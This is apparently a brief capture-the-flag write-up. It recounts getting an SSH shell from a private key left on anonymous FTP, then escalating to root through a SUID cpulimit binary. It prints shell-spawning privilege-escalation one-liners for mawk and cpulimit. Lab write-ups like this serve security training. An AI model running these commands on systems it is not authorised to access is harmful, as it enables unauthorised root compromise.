SSH access yielded an initial shell and the first flag.


The SUID inventory included the unusual binaries mawk and cpulimit.
The mawk test did not yield elevated access.
The cpulimit SUID configuration led to root access and the second flag.
```bash
# mawk mawk
mawk 'BEGIN {system("/bin/sh")}'

# cpulimit
cpulimit -l 100 -f -- /bin/sh -p
```

#### Recap
Anonymous FTP exposed an SSH private key that authenticated to the target.
The SUID configuration on cpulimit crossed the privilege boundary and yielded root access.
